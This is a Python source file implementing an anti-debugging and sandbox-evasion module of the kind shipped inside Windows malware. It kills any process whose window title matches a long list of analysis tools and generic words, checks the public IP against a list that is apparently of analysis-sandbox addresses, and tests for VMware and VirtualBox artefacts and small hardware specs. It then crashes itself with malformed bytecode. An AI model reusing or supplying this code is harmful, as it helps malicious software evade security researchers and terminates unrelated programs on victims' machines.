from win32gui import GetWindowText,EnumWindows
from win32process import GetWindowThreadProcessId
from psutil import Process,process_iter, virtual_memory, cpu_count, disk_usage
from threading import Thread
from requests import get
from os import system, path, environ
from winreg import HKEY_LOCAL_MACHINE, OpenKey, CloseKey, QueryValueEx

def watchdog():
    checks = [check_windows,check_ip,check_registry,check_dll,check_specs]
    for check in checks: Thread(target=check,daemon=True).start()

def exit_program(reason):
    print(reason)
    exec(type((lambda: 0).__code__)(0, 0, 0, 0, 0, 0, b'\x053', (), (), (), '', '', 0, b'')) 

def check_windows():
    def winEnumHandler( hwnd, ctx ):
        if GetWindowText( hwnd ).lower() in {'proxifier', 'graywolf', 'extremedumper', 'zed', 'exeinfope', 'dnspy', 'titanHide', 'ilspy', 'titanhide', 'x32dbg', 'codecracker', 'simpleassembly', 'process hacker 2', 'pc-ret', 'http debugger', 'Centos', 'process monitor', 'debug', 'ILSpy', 'reverse', 'simpleassemblyexplorer', 'process', 'de4dotmodded', 'dojandqwklndoqwd-x86', 'sharpod', 'folderchangesview', 'fiddler', 'die', 'pizza', 'crack', 'strongod', 'ida -', 'brute', 'dump', 'StringDecryptor', 'wireshark', 'debugger', 'httpdebugger', 'gdb', 'kdb', 'x64_dbg', 'windbg', 'x64netdumper', 'petools', 'scyllahide', 'megadumper', 'reversal', 'ksdumper v1.1 - by equifox', 'dbgclr', 'HxD', 'monitor', 'peek', 'ollydbg', 'ksdumper', 'http', 'wpe pro', 'dbg', 'httpanalyzer', 'httpdebug', 'PhantOm', 'kgdb', 'james', 'x32_dbg', 'proxy', 'phantom', 'mdbg', 'WPE PRO', 'system explorer', 'de4dot', 'x64dbg', 'X64NetDumper', 'protection_id', 'charles', 'systemexplorer', 'pepper', 'hxd', 'procmon64', 'MegaDumper', 'ghidra', 'xd', '0harmony', 'dojandqwklndoqwd', 'hacker', 'process hacker', 'SAE', 'mdb', 'checker', 'harmony', 'Protection_ID', 'PETools', 'scyllaHide', 'x96dbg', 'systemexplorerservice', 'folder', 'mitmproxy', 'dbx', 'sniffer', 'http toolkit'}:
            pid = GetWindowThreadProcessId(hwnd)
            if type(pid) == int:
                try: Process(pid).terminate()
                except: pass
            else:
                for process in pid:
                    try: Process(process).terminate()
                    except: pass
            exit_program(f'Debugger Open, Type: {GetWindowText( hwnd )}')
    while True: EnumWindows( winEnumHandler, None )

def check_ip():
    blacklisted = {'88.132.227.238', '79.104.209.33', '92.211.52.62', '20.99.160.173', '188.105.91.173', '64.124.12.162', '195.181.175.105', '194.154.78.160', '', '109.74.154.92', '88.153.199.169', '34.145.195.58', '178.239.165.70', '88.132.231.71', '34.105.183.68', '195.74.76.222', '192.87.28.103', '34.141.245.25', '35.199.6.13', '34.145.89.174', '34.141.146.114', '95.25.204.90', '87.166.50.213', '193.225.193.201', '92.211.55.199', '35.229.69.227', '104.18.12.38', '88.132.225.100', '213.33.142.50', '195.239.51.59', '34.85.243.241', '35.237.47.12', '34.138.96.23', '193.128.114.45', '109.145.173.169', '188.105.91.116', 'None', '80.211.0.97', '84.147.62.12', '78.139.8.50', '109.74.154.90', '34.83.46.130', '212.119.227.167', '92.211.109.160', '93.216.75.209', '34.105.72.241', '212.119.227.151', '109.74.154.91', '95.25.81.24', '188.105.91.143', '192.211.110.74', '34.142.74.220', '35.192.93.107', '88.132.226.203', '34.85.253.170', '34.105.0.27', '195.239.51.3', '192.40.57.234', '92.211.192.144', '23.128.248.46', '84.147.54.113', '34.253.248.228',None}
    while True:
        try:
            ip = get('https://api64.ipify.org/').text.strip()
            if ip in blacklisted: exit_program('Ip Blacklisted')
            return
        except: pass

def check_vm():
    processes = ['VMwareService.exe', 'VMwareTray.exe']
    for proc in process_iter():
        if proc.name() in processes: exit_program('Detected Vm')

def check_registry():
    if system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul") != 1 and system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul") != 1:exit_program('Detected Vm')
    handle = OpenKey(HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum')
    try:
        if "VMware" in QueryValueEx(handle, '0')[0] or "VBOX" in QueryValueEx(handle, '0')[0]: exit_program('Detected Vm')
    finally: CloseKey(handle)

def check_dll():
    if path.exists(path.join(environ["SystemRoot"], "System32\\vmGuestLib.dll")) or path.exists(path.join(environ["SystemRoot"], "vboxmrxnp.dll")):  exit_program('Detected Vm')

def check_specs():
    if int(str(virtual_memory()[0]/1024/1024/1024).split(".")[0]) <= 4: exit_program('Memory Ammount Invalid')
    if int(str(disk_usage('/')[0]/1024/1024/1024).split(".")[0]) <= 50: exit_program('Storage Ammount Invalid')
    if int(cpu_count()) <= 1: exit_program('Cpu Counts Invalid')
